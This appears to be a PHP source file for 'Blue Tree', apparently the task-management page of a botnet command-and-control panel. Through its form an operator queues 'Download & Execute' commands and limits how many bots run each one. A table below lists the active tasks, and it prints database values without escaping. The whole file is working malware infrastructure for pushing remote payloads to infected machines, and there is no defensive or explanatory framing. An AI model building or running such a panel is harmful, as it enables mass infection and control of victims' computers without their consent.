<?php
include_once("config.php");

	if(isset($_POST["maxbots"]) && !empty($_POST["cmd_type"]) && isset($_POST["cmd_data"])){
		
		$insert_task = "INSERT INTO `tasks` (`cmd_num`, `cmd`, `maxbots`, `time_added`) VALUES (:cmdnum, :cmd, :maxbots, CURRENT_TIMESTAMP)";
		if(array_key_exists($_POST["cmd_type"], $task_array)){
			if($sth = $db->prepare($insert_task)){
				$sth->bindParam(":cmdnum", $_POST["cmd_type"]);
				$sth->bindParam(":cmd", $_POST["cmd_data"]);
				$sth->bindParam(":maxbots", $_POST["maxbots"]);
				$sth->execute();
				
			}
		}
	}
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <title>Blue Tree - Manage Tasks</title>
	<link rel="stylesheet" href="assets/vendor_components/bootstrap/dist/css/bootstrap.css">
	<link rel="stylesheet" href="css/bootstrap-extend.css">
	<link rel="stylesheet" href="css/master_style.css">
	<link rel="stylesheet" href="css/skins/_all-skins.css">
    <link href="assets/vendor_components/jvectormap/lib2/jquery-jvectormap-2.0.2.css" rel="stylesheet" />
	<!--[if lt IE 9]>
	<script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->

     
  </head>

<body class="hold-transition skin-blue sidebar-mini">
<div class="wrapper">

  <header class="main-header">
    <a href="index.php" class="logo">
      
	  <b class="logo-lg">
		  <span><p>Blue Tree</p> </span>
	  </b>
    </a>
  </header>
  
  <?php

include_once("sidebar.php");
?>

  <div class="content-wrapper">
    <section class="content-header">
      <h1>
	  Blue Tree
        <small>Manage Tasks</small>
      </h1>
    </section>

    <section class="content">
	 

<div class="row">
 <div class="col-12">
          <div class="box">
            <div class="box-header with-border">
              <h4 class="box-title">Create Task</h4>
            </div>
            <div class="box-body">
              <form role="form" method="POST">
                
                <div class="form-group has-success">
                  <center><label class="control-label" for="inputSuccess">Command Data</label></center>
                  <input type="text" class="form-control" id="inputSuccess" placeholder="Enter command data..." name="cmd_data">
                </div>
                
				<div class="form-group has-success">
				   <center><label for="number-input" class="control-label">Number of Bots to Execute on</label></center>
				  <input class="form-control" type="number" value="0" id="example-number-input" name="maxbots">
                  <center><span class="help-block">Leave this 0 if you do not want to limit executions</span></center>
				</div>

                <div class="form-group" name="cmd_type">
                  <div class="radio">
                  	  <input name="cmd_type" type="radio" id="dl" value="1">
					  <label for="dl">Download & Execute</label>                    
                  </div>
                </div>

                <div class="box-footer">
					<button type="submit" class="btn btn-danger">Cancel</button>
					<button type="submit" class="btn btn-success pull-right">Submit</button>
				</div>
              </form>
            </div>
          </div>
        </div>
	</div>
	  
	  
	  <div class="row">
		  
		<div class="col-12">
         
         <div class="box">
            <div class="box-header with-border">
              <h3 class="box-title">Current Tasks</h3>
            </div>
            <div class="box-body">
				<div class="table-responsive">
				  <table id="example5" class="table table-bordered table-striped" style="width:100%">
					<thead>
						<tr>
							<th>ID</th>
							<th>Status</th>
							<th>Command Type</th>
							<th>Command Data</th>
							<th>Options</th>
						</tr>
					</thead>
					<tbody>
					<?php
					$tasks = "SELECT * FROM `tasks`";
					if($sth = $db->prepare($tasks)){
						$sth->execute();
						$task_array = array(
						"1" => "Download & Execute"
						);
						$status = "";
						while($row = $sth->fetch(PDO::FETCH_ASSOC)){
							if($row["status"] == "1"){
								$status = "Active";
							}
							else{
								$status = "Disabled";
							}
							
							echo "<tr><td>".$row["id"]."</td><td>".$status."</td><td>".$task_array[$row["cmd_num"]]."</td><td>".$row["cmd"]."</td><td><a href='taskinfo.php?id=".$row["id"]."' type='submit' class='btn btn-success'>Manage</a></td></tr>";
						}
					}
					
					?>
					</tbody>
				</table>
				</div>
            </div>
            <!-- /.box-body -->
          </div>
          <!-- /.box -->      
        </div>  
		  
      </div>
    </section>
  </div>
  <footer class="main-footer">
	<center><b><u>Blue Tree</u></b></center>
  </footer>
  <div class="control-sidebar-bg"></div>
  
</div>

	<script src="assets/vendor_components/jquery/dist/jquery.js"></script>
	<script src="assets/vendor_components/jquery-ui/jquery-ui.js"></script>
	<script src="assets/vendor_components/popper/dist/popper.min.js"></script>
	<script src="assets/vendor_components/bootstrap/dist/js/bootstrap.js"></script>	
	<script src="assets/vendor_components/jquery-slimscroll/jquery.slimscroll.js"></script>
	<script src="assets/vendor_components/fastclick/lib/fastclick.js"></script>
	<script src="assets/vendor_components/jquery.peity/jquery.peity.js"></script>
	<script src="assets/vendor_components/raphael/raphael.min.js"></script>
    <script src="assets/vendor_components/jvectormap/lib2/jquery-jvectormap-2.0.2.min.js"></script>
    <script src="assets/vendor_components/jvectormap/lib2/jquery-jvectormap-world-mill-en.js"></script>
    <script src="assets/vendor_components/jvectormap/lib2/jquery-jvectormap-us-aea-en.js"></script>
	<script src="js/template.js"></script>
	<script type="text/javascript">

	</script>
	
</body>
</html>
